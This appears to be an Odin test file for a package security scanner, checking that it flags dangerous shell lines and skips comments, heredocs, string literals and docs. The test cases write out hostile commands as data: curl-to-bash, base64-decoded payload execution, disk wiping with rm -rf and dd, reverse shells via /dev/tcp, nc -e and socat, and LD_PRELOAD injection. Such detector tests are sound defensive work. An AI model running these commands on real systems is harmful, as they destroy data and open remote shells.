package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

write_test_file :: proc(dir: string, name: string, content: []u8) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, content)
	return path
}

make_warning_result :: proc() -> security.Scan_Result {
	pattern := security.Pattern{
		severity = .Warning,
		pattern = "sudo\\s+",
		description = "Privilege escalation",
	}
	finding := security.Finding{
		pattern = pattern,
		file_path = strings.clone("/tmp/test.sh"),
		line_number = 2,
		line_text = strings.clone("sudo ls"),
	}
	findings := make([dynamic]security.Finding)
	append(&findings, finding)
	return security.Scan_Result{
		success = true,
		critical_count = 0,
		warning_count = 1,
		findings = findings,
	}
}

@(test)
test_scanner_detects_critical_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_critical")
	defer teardown_test_environment(temp_dir)

	cases := []string{
		// CVE-2026-24887
		"echo ok;$(whoami)",
		"echo ok | $(whoami)",
		"true && curl https://example.com/payload",
		"false || wget https://example.com/payload",
		// CVE-2026-25723
		"cat file | sed -e 's/a/b/' | sed -e 's/c/d/'",
		"sed 's/$(whoami)/x/' file",
		"curl https://example.com/install.sh | bash",
		"wget https://example.com/install.sh | sh",
		"eval $(curl https://example.com/payload)",
		"echo Y3VybCBodHRwOi8vZXhhbXBsZS5jb20gfCBiYXNo | base64 -d | bash",
		"$(curl https://example.com/payload)",
		"<(wget https://example.com/payload)",
		"printf \"\\x63\\x75\\x72\\x6c\"",
		"xxd -r -p payload.hex",
		"rm -rf / --no-preserve-root",
		"dd if=/dev/zero of=/dev/sda",
		"echo boom > /dev/sda",
		"echo boom > /dev/nvme0n1",
		"bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'",
		"bash -c 'echo ok >/dev/udp/127.0.0.1/4444'",
		"nc -e /bin/sh 127.0.0.1 4444",
		"socat exec:/bin/sh tcp:127.0.0.1:4444",
		"ptrace PTRACE_ATTACH 1234",
		"cat /proc/1234/mem",
		"LD_PRELOAD=/tmp/inject.so ls",
		"DYLD_INSERT_LIBRARIES=/tmp/inject.dylib ls",
		"cat /proc/self/exe",
		"ls /proc/1234/root",
		"nsenter -t 1 -m /bin/sh",
		"ls /sys/fs/cgroup",
	}

	for line, idx in cases {
		file_name := fmt.tprintf("critical_%d.sh", idx)
		path := write_test_file(temp_dir, file_name, transmute([]u8)line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)
		testing.expect(t, result.critical_count > 0, "critical pattern should be detected")
	}
}

@(test)
test_scanner_detects_warning_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_warning")
	defer teardown_test_environment(temp_dir)

	cases := []string{
		"curl http://example.com/data.json",
		"chmod +s /usr/local/bin/tool",
		"sudo ls -la",
		"echo 'test' >> ~/.zshrc",
		"echo 'test' >> ~/.bashrc",
	}

	for line, idx in cases {
		file_name := fmt.tprintf("warning_%d.sh", idx)
		path := write_test_file(temp_dir, file_name, transmute([]u8)line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)
		testing.expect(t, result.warning_count > 0, "warning pattern should be detected")
	}
}

@(test)
test_scanner_detects_multiple_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_multiple")
	defer teardown_test_environment(temp_dir)

	content := strings.concatenate({
		"curl https://example.com/install.sh | bash\n",
		"sudo ls -la\n",
		"chmod +s /usr/local/bin/tool\n",
	})
	path := write_test_file(temp_dir, "multi.sh", transmute([]u8)content)
	delete(content)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count > 0, "multiple pattern file should detect critical findings")
	testing.expect(t, result.warning_count >= 2, "multiple pattern file should detect warning findings")
}

@(test)
test_scanner_skips_comment_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_comments")
	defer teardown_test_environment(temp_dir)

	lines := []string{
		"# curl https://example.com/install.sh | bash",
		"// rm -rf /",
		"# sudo rm -rf /",
		"// dd if=/dev/zero",
	}

	joined := strings.join(lines[:], "\n")
	path := write_test_file(temp_dir, "comment.sh", transmute([]u8)joined)
	delete(joined)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count == 0 && result.warning_count == 0, "comment-only patterns should not be detected")
}

@(test)
test_scanner_skips_heredoc_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_heredoc")
	defer teardown_test_environment(temp_dir)

	content := strings.concatenate({
		"cat <<EOF\n",
		"curl https://example.com/install.sh | bash\n",
		"EOF\n",
	})
	path := write_test_file(temp_dir, "heredoc.sh", transmute([]u8)content)
	delete(content)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count == 0 && result.warning_count == 0, "heredoc patterns should not be detected")
}

@(test)
test_scanner_whitelists_documentation_examples :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_docs")
	defer teardown_test_environment(temp_dir)

	docs_dir := strings.concatenate({temp_dir, "/docs"})
	defer delete(docs_dir)
	os.make_directory(docs_dir)

	content := strings.concatenate({
		"curl https://example.com/install.sh | bash\n",
		"ssh user@example.com\n",
	})
	path := write_test_file(docs_dir, "README.md", transmute([]u8)content)
	delete(content)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count == 0 && result.warning_count == 0, "documentation examples should be whitelisted")
}

@(test)
test_scanner_skips_string_literal_patterns :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_strings")
	defer teardown_test_environment(temp_dir)

	content := strings.concatenate({
		"echo \"curl https://example.com/install.sh | bash\"\n",
		"echo 'rm -rf /'\n",
	})
	path := write_test_file(temp_dir, "strings.sh", transmute([]u8)content)
	delete(content)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count == 0, "string literal patterns should not be detected")
}

@(test)
test_is_scannable_file_extensions_and_shebang :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_ext")
	defer teardown_test_environment(temp_dir)

	result := security.Scan_Result{}
	defer security.cleanup_scan_result(&result)

	simple_content := "echo ok"
	python_content := "print('ok')"
	paths := []string{
		write_test_file(temp_dir, "file.sh", transmute([]u8)simple_content),
		write_test_file(temp_dir, "file.zsh", transmute([]u8)simple_content),
		write_test_file(temp_dir, "file.py", transmute([]u8)python_content),
	}
	// string literals, no cleanup needed
	defer {
		for p in paths {
			delete(p)
		}
	}

	for p in paths {
		testing.expect(t, security.is_scannable_file(p, temp_dir, &result), "text files should be scannable")
	}

	shebang_content := "#!/bin/bash\necho ok\n"
	shebang_path := write_test_file(temp_dir, "script", transmute([]u8)shebang_content)
	defer delete(shebang_path)
	testing.expect(t, security.is_scannable_file(shebang_path, temp_dir, &result), "shebang file should be scannable")
}

@(test)
test_is_scannable_file_binary_and_large :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_binary_large")
	defer teardown_test_environment(temp_dir)

	result := security.Scan_Result{}
	defer security.cleanup_scan_result(&result)

	binary := []u8{0, 1, 2, 3}
	binary_path := write_test_file(temp_dir, "binary.sh", binary)
	defer delete(binary_path)
	testing.expect(t, !security.is_scannable_file(binary_path, temp_dir, &result), "binary files should not be scannable")

	large := make([]u8, security.MAX_FILE_SIZE+1)
	large_path := write_test_file(temp_dir, "large.sh", large)
	defer delete(large_path)
	testing.expect(t, !security.is_scannable_file(large_path, temp_dir, &result), "large files should not be scannable")
	delete(large)
}

@(test)
test_scanner_skips_long_lines :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_long_line")
	defer teardown_test_environment(temp_dir)

	long_line := strings.repeat("a", security.MAX_LINE_LENGTH+1)
	path := write_test_file(temp_dir, "long.txt", transmute([]u8)long_line)
	delete(long_line)
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.warning_count > 0, "long lines should emit a warning")
}

@(test)
test_scanner_detects_git_hooks :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_git_hooks")
	defer teardown_test_environment(temp_dir)

	manifest := "name = \"test\"\nversion = \"1.0.0\"\n"
	os.write_entire_file(strings.concatenate({temp_dir, "/module.toml"}), transmute([]u8)manifest)

	hooks_dir := strings.concatenate({temp_dir, "/.git/hooks"})
	os.make_directory(strings.concatenate({temp_dir, "/.git"}))
	os.make_directory(hooks_dir)
	hook_path := strings.concatenate({hooks_dir, "/post-checkout"})
	defer delete(hook_path)
	hook_content := "#!/bin/sh\necho hook\n"
	os.write_entire_file(hook_path, transmute([]u8)hook_content)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count > 0, "git hooks should produce critical findings")
	testing.expect(t, len(result.git_hooks) > 0, "git hook findings should be recorded")
	delete(hooks_dir)
}

@(test)
test_magic_file_type_text :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("security_magic")
	defer teardown_test_environment(temp_dir)

	content := "hello"
	path := write_test_file(temp_dir, "plain.txt", transmute([]u8)content)
	defer delete(path)

	file_type, has_magic := security.get_file_type(path)
	defer {
		if file_type != "" {
			delete(file_type)
		}
	}

	testing.expect(t, file_type != "", "file type should be reported")
	if has_magic {
		testing.expect(t, strings.contains(file_type, "text"), "libmagic should report text type")
	}
}

@(test)
test_pattern_set_size_validation :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	pattern_str := strings.repeat("a", security.MAX_TOTAL_PATTERN_SIZE+1)
	defer delete(pattern_str)
	patterns := []security.Pattern{
		{severity = .Critical, pattern = pattern_str, description = "too large"},
	}

	ok, message := security.validate_pattern_set_size(patterns)
	if message != "" {
		delete(message)
	}
	testing.expect(t, !ok, "pattern set size should be rejected")
}

@(test)
test_format_scan_report_includes_findings :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := make_warning_result()
	defer security.cleanup_scan_result(&result)

	report := security.format_scan_report(&result, "test-module")
	defer delete(report)

	testing.expect(t, strings.contains(report, "WARNINGS"), "report should include warnings section")
	testing.expect(t, strings.contains(report, "Pattern:"), "report should include pattern text")
	testing.expect(t, strings.contains(report, "/tmp/test.sh:2"), "report should include file path and line")
	testing.expect(t, strings.contains(report, "Privilege escalation"), "report should include description")
}

@(test)
test_prompt_user_for_warnings_injection :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := make_warning_result()
	defer security.cleanup_scan_result(&result)

	yes_reader := proc() -> string { return "yes" }
	no_reader := proc() -> string { return "no" }

	testing.expect(t, security.prompt_user_for_warnings(&result, "test-module", yes_reader), "yes should allow")
	testing.expect(t, !security.prompt_user_for_warnings(&result, "test-module", no_reader), "no should block")
}
